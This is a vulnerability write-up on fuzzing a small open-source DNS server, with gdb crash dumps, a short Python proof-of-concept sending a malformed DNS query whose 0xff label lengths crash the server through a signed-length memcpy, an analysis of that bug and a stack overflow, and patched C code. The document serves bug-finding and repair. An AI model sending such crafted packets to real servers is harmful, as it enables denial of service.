# dns-server

So this server was found at: `https://github.com/901/dns-server.git`

So this server has two bugs. Both can be found with the fuzzer.

So we start off with fuzzing the server. First run the server in gdb:

```
$    sudo gdb ./dns-server
GNU gdb (Ubuntu 9.1-0ubuntu1) 9.1
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
87 commands loaded for GDB 9.1 using Python engine 3.8
[*] 5 commands could not be loaded, run `gef missing` to know why.
GEF for linux ready, type `gef' to start, `gef config' to configure
87 commands loaded for GDB 9.1 using Python engine 3.8
[*] 5 commands could not be loaded, run `gef missing` to know why.
Reading symbols from ./dns-server...
gef➤  r -p 563 -f hosts
Starting program: /Hackery/not_ready_to_die/dns-server0/vuln/dns-server -p 563 -f hosts
addr 127.0.0.1     name: localhost
addr 127.0.1.1     name: ubuntu
addr The     name: following
addr lines     name: are
addr desirable     name: for
addr IPv6     name: capable
addr hosts     name: ::1
addr ip6-localhost     name: ip6-loopback
addr fe00::0     name: ip6-localnet
addr ff00::0     name: ip6-mcastprefix
addr ff02::1     name: ip6-allnodes
addr ff02::2     name: ip6-allrouters
==WAITING ON PORT 563==
```

We start the fuzzer:
```
$    python3 fuzz.py -i 127.0.0.1 -p 563
```

Then we see that we have encountered a bug:

```
received 27 bytes
Correct query field - identified question
Query count: 0
Query length: 10
len (1): 117

Program received signal SIGSEGV, Segmentation fault.
__memmove_avx_unaligned_erms () at ../sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S:498
498    ../sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S: No such file or directory.

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007fffffffdaa6  →  0x7ffff7ee652a0000
$rbx   : 0x0000555555556030  →  <__libc_csu_init+0> endbr64
$rcx   : 0x00007fffffffda85  →  0xe953000000000000
$rdx   : 0xffffffffffffed65
$rsp   : 0x00007fffffffd9c8  →  0x0000555555555a7c  →  <process_request+506> mov rax, QWORD PTR [rbp-0x130]
$rbp   : 0x00007fffffffdb40  →  0xffffffde1000007f
$rsi   : 0x00007fffffffefcd  →  "t_ready_to_die/dns-server0/vuln/dns-server"
$rdi   : 0x00007fffffffed40  →  "5:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35[...]"
$rip   : 0x00007ffff7f51959  →  <__memmove_avx_unaligned_erms+745> vmovdqu ymm1, YMMWORD PTR [rsi+0x20]
$r8    : 0xffffffffffffffe6
$r9    : 0xd               
$r10   : 0x00007fffffffdaa5  →  0xfff7ee652a00002e ("."?)
$r11   : 0x00007fffffffdaa6  →  0x7ffff7ee652a0000
$r12   : 0x0000555555555320  →  <_start+0> endbr64
$r13   : 0x00007fffffffe5b0  →  "ELL=/bin/bash"
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffd9c8│+0x0000: 0x0000555555555a7c  →  <process_request+506> mov rax, QWORD PTR [rbp-0x130]     ← $rsp
0x00007fffffffd9d0│+0x0008: 0x0000000400049d65
0x00007fffffffd9d8│+0x0010: 0x00007fffffffdcb0  →  0xfff7fb500000007f
0x00007fffffffd9e0│+0x0018: 0x0000000600000001
0x00007fffffffd9e8│+0x0020: 0x0000000000000fff
0x00007fffffffd9f0│+0x0028: 0x0000000000000000
0x00007fffffffd9f8│+0x0030: 0xffffffff0000000a
0x00007fffffffda00│+0x0038: 0x0000000000001000
──────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7ffff7f51947 <__memmove_avx_unaligned_erms+727> prefetcht0 BYTE PTR [rsi+0x180]
   0x7ffff7f5194e <__memmove_avx_unaligned_erms+734> prefetcht0 BYTE PTR [rsi+0x1c0]
   0x7ffff7f51955 <__memmove_avx_unaligned_erms+741> vmovdqu ymm0, YMMWORD PTR [rsi]
 → 0x7ffff7f51959 <__memmove_avx_unaligned_erms+745> vmovdqu ymm1, YMMWORD PTR [rsi+0x20]
   0x7ffff7f5195e <__memmove_avx_unaligned_erms+750> vmovdqu ymm2, YMMWORD PTR [rsi+0x40]
   0x7ffff7f51963 <__memmove_avx_unaligned_erms+755> vmovdqu ymm3, YMMWORD PTR [rsi+0x60]
   0x7ffff7f51968 <__memmove_avx_unaligned_erms+760> add    rsi, 0x80
   0x7ffff7f5196f <__memmove_avx_unaligned_erms+767> sub    rdx, 0x80
   0x7ffff7f51976 <__memmove_avx_unaligned_erms+774> vmovntdq YMMWORD PTR [rdi], ymm0
──────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "dns-server", stopped 0x7ffff7f51959 in __memmove_avx_unaligned_erms (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7ffff7f51959 → __memmove_avx_unaligned_erms()
[#1] 0x555555555a7c → process_request(recvbuf=0x7fffffffdcb0, fd=0x4)
─────────────────────────────────────────────────────────────────────────────────────────────────────────








[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007fffffffdaa6  →  0x7ffff7ee652a0000
$rbx   : 0x0000555555556030  →  <__libc_csu_init+0> endbr64
$rcx   : 0x00007fffffffda85  →  0xe953000000000000
$rdx   : 0xffffffffffffed65
$rsp   : 0x00007fffffffd9c8  →  0x0000555555555a7c  →  <process_request+506> mov rax, QWORD PTR [rbp-0x130]
$rbp   : 0x00007fffffffdb40  →  0xffffffde1000007f
$rsi   : 0x00007fffffffefcd  →  "t_ready_to_die/dns-server0/vuln/dns-server"
$rdi   : 0x00007fffffffed40  →  "5:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35[...]"
$rip   : 0x00007ffff7f51959  →  <__memmove_avx_unaligned_erms+745> vmovdqu ymm1, YMMWORD PTR [rsi+0x20]
$r8    : 0xffffffffffffffe6
$r9    : 0xd               
$r10   : 0x00007fffffffdaa5  →  0xfff7ee652a00002e ("."?)
$r11   : 0x00007fffffffdaa6  →  0x7ffff7ee652a0000
$r12   : 0x0000555555555320  →  <_start+0> endbr64
$r13   : 0x00007fffffffe5b0  →  "ELL=/bin/bash"
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffd9c8│+0x0000: 0x0000555555555a7c  →  <process_request+506> mov rax, QWORD PTR [rbp-0x130]     ← $rsp
0x00007fffffffd9d0│+0x0008: 0x0000000400049d65
0x00007fffffffd9d8│+0x0010: 0x00007fffffffdcb0  →  0xfff7fb500000007f
0x00007fffffffd9e0│+0x0018: 0x0000000600000001
0x00007fffffffd9e8│+0x0020: 0x0000000000000fff
0x00007fffffffd9f0│+0x0028: 0x0000000000000000
0x00007fffffffd9f8│+0x0030: 0xffffffff0000000a
0x00007fffffffda00│+0x0038: 0x0000000000001000
──────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7ffff7f51947 <__memmove_avx_unaligned_erms+727> prefetcht0 BYTE PTR [rsi+0x180]
   0x7ffff7f5194e <__memmove_avx_unaligned_erms+734> prefetcht0 BYTE PTR [rsi+0x1c0]
   0x7ffff7f51955 <__memmove_avx_unaligned_erms+741> vmovdqu ymm0, YMMWORD PTR [rsi]
 → 0x7ffff7f51959 <__memmove_avx_unaligned_erms+745> vmovdqu ymm1, YMMWORD PTR [rsi+0x20]
   0x7ffff7f5195e <__memmove_avx_unaligned_erms+750> vmovdqu ymm2, YMMWORD PTR [rsi+0x40]
   0x7ffff7f51963 <__memmove_avx_unaligned_erms+755> vmovdqu ymm3, YMMWORD PTR [rsi+0x60]
   0x7ffff7f51968 <__memmove_avx_unaligned_erms+760> add    rsi, 0x80
   0x7ffff7f5196f <__memmove_avx_unaligned_erms+767> sub    rdx, 0x80
   0x7ffff7f51976 <__memmove_avx_unaligned_erms+774> vmovntdq YMMWORD PTR [rdi], ymm0
──────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "dns-server", stopped 0x7ffff7f51959 in __memmove_avx_unaligned_erms (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7ffff7f51959 → __memmove_avx_unaligned_erms()
[#1] 0x555555555a7c → process_request(recvbuf=0x7fffffffdcb0, fd=0x4)
─────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  bt
#0  __memmove_avx_unaligned_erms () at ../sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S:498
#1  0x0000555555555a7c in process_request (recvbuf=0x7fffffffdcb0, fd=0x4) at dns-server.c:181
#2  0xff0000000000007f in ?? ()
#3  0x000000000000007f in ?? ()
#4  0xfff7dd8330000000 in ?? ()
#5  0x000000000000007f in ?? ()
#6  0x0000000000000000 in ?? ()
```

So we can see, that this is a crash resulting from a memory read. Now to help debug this, we run a quick python3 script to send a specially crafted DNS query (`poc.py`):

```
import socket

if __name__ == "__main__":
    #print("poc")
    conn = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    conn.connect(("127.0.0.1", 563))


    ID = b"\x12\x23"
    FLAGS = b"\x01\x00"
    QDCOUNT = b"\x00\x01"
    ANCOUNT = b"\x00\x00"
    NSCOUNT = b"\x00\x00"
    ARCOUNT = b"\x00\x00"

    HEADER = ID + FLAGS + QDCOUNT + ANCOUNT + NSCOUNT + ARCOUNT

    QNAME = b"\xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\x00"
    QTYPE = b"\x00\x01"
    QCLASS = b"\x00\x01"

    QUESTION = QNAME + QTYPE + QCLASS

    PACKET = HEADER + QUESTION

    conn.send(PACKET)
```

Looking at the call stack, we see that the crash happens in the `process_request` function, of which this is the relevant part:

```
void process_request (void* recvbuf, int fd) {

        char* foundaddr;
        int i = 0;
        unsigned int addr;
    int querylen;

        dns_header* header = (dns_header*) recvbuf;
       
    //DEBUG - IGNORE
    //printf("id: %d\n", header->id);
        
    if(header->qr == 0) {
                printf("Correct query field - identified question\n");
                printf("Query count: %d\n", htons(header->qd_count));

                char* query = (char*)recvbuf + sizeof(dns_header); //gets the query name
                char name[256];
                char* namep = name;
                int len;
        int found = 0; //default 0 not found
               querylen = strlen(query);

        //creates the position for the second query
        char* ansname = (char*)recvbuf + sizeof(dns_header) + querylen + 1 + sizeof(dns_question);
        
        printf("Query length: %d\n", querylen);
        memcpy(ansname, query, querylen + 1);
        
        //DEBUG - IGNORE
        //printf("ansname; %s\n", ansname);
        

        //reading the query name
                while((int)*query != 0) {
                    len = (int)*query;
                    printf("len (1): %d\n", len);
                    memcpy(namep, query + 1, len);
                    namep += len;
                    query += len + 1;
                    len = (int)*query;
                    if(len != 0) {
                            *namep++ = '.';
                            memcpy(namep, query + 1, len);
                    }
                    *namep = 0;
                }
```

So by looking at the assembly and comparing it to the source code, we see a few things. First off, the functions `memcpy` when being compiled get replaced by `memmove`. In addition to that, the `memcpy` that the crash happens at primarily is the first `memcpy` in the `while` statement (although depending on the query, the second `memcpy` could potentially also cause the same issue). When we run the `poc.py` function, and break at the `memcpy` call, we see something very interesting:

```
Starting program: /Hackery/not_ready_to_die/dns-server0/vuln/dns-server -p 563 -f hosts
addr 127.0.0.1     name: localhost
addr 127.0.1.1     name: ubuntu
addr The     name: following
addr lines     name: are
addr desirable     name: for
addr IPv6     name: capable
addr hosts     name: ::1
addr ip6-localhost     name: ip6-loopback
addr fe00::0     name: ip6-localnet
addr ff00::0     name: ip6-mcastprefix
addr ff02::1     name: ip6-allnodes
addr ff02::2     name: ip6-allrouters
==WAITING ON PORT 563==
received 529 bytes
Correct query field - identified question
Query count: 1
Query length: 512
len (1): -1

.    .    .

──────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
memcpy@plt (
   $rdi = 0x00007fffffffda30 → 0x0000000000000280,
   $rsi = 0x00007fffffffdcbd → "ffffffffffffffffffffffffffffffffffffffffffffffffff[...]",
   $rdx = 0xffffffffffffffff,
   $rcx = 0x00007fffffffdcbd → "ffffffffffffffffffffffffffffffffffffffffffffffffff[...]",
   $r8 = 0x0000000000000000
)
──────────────────────────────────────────────────────────────────────────── source:dns-server.c+175 ────
    170    
    171             //reading the query name
    172                     while((int)*query != 0) {
    173                         len = (int)*query;
    174                         printf("len (1): %d\n", len);
                             // namep=0x00007fffffffda10  →  [...]  →  0x0000000000000280, len=-0x1, query=0x00007fffffffda08  →  [...]  →  0x66666666666666ff
 →  175                         memcpy(namep, query + 1, len);
    176                         namep += len;
    177                         query += len + 1;
    178                         len = (int)*query;
    179                         if(len != 0) {
    180                                 *namep++ = '.';
──────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "dns-server", stopped 0x5555555559fe in process_request (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x5555555559fe → process_request(recvbuf=0x7fffffffdcb0, fd=0x4)
[#1] 0x55555555586a → main(argc=0x5, argv=0x7fffffffe5b8)
─────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
```

We see here, the size value stored in `rdx` is extremely large, and is `0xffffffffffffffff`. This is an insanely large value, and will try to write all possible memory addresses, because this an `x64` binary. Of course, not all memory addresses are mapped, and it will inevitably either try to write to an address that is not writeable, or read from an address that is not readable (either not mapped, or without the permissions).

So for looking at what the cause of this bug is, it appears to be a type confusion bug. The length variable is a signed integer. We see when it is printed, it has the value of `-1`, which is represented by `0xffffffffffffffff`. The `memcpy` call takes an unsigned integer as the size argument, not a signed data value, so it interprets that `-1` as a huge value. For how that `-1` got there in the first place, the query I crafted listed the size for the various dns parts as `0xff`, which due to the datatype conversions, ends up becoming `0xffffffffffffffff` when it is finally passed to the `memcpy` call. To patch this value, we just replace the `len` data type with `unt8_t`. This is because it is an unsigned integer, and the size should never be greater than `0xff` (since the data value it comes from is the size octet from the dns name, which is only a single byte).

There is a secondary bug present in here. That is, it constructs and writes the name to a fixed size buffer on the stack, which it doesn't check for an overflow (similar to `SimpleDNS`). Simply adding a variable to keep track of the written bytes, and adding a check to check for an overflow will patch that bug.

This is the patched code:
```

                char* query = (char*)recvbuf + sizeof(dns_header); //gets the query name
                char name[256];
                char* namep = name;
                uint8_t len;
                unsigned int bytes_recieved = 0;
        int found = 0; //default 0 not found
               querylen = strlen(query);

        //creates the position for the second query
        char* ansname = (char*)recvbuf + sizeof(dns_header) + querylen + 1 + sizeof(dns_question);
        
        printf("Query length: %d\n", querylen);
        memcpy(ansname, query, querylen + 1);
        
        //DEBUG - IGNORE
        //printf("ansname; %s\n", ansname);
        

        //reading the query name
                while((int)*query != 0) {
                    len = (uint8_t)*query;
                    printf("len (1): %d\n", len);
                    if ((bytes_recieved + len) >= 256) {
                        return;
                    }
                    memcpy(namep, query + 1, len);
                    bytes_recieved += len;
                    namep += len;
                    query += len + 1;
                    len = (uint8_t)*query;
                    if(len != 0) {
                        if ((bytes_recieved + len) >= 256) {
                            return;
                        }
                            *namep++ = '.';
                            memcpy(namep, query + 1, len);
                            bytes_recieved += len;
                    }
                    *namep = 0;
                }
```

When we compile and run the patch, we see that it works, and that the `poc.py` is unable to use either bug to crash the server. For more info, checkout: `https://youtu.be/K9Nad5diH2k`
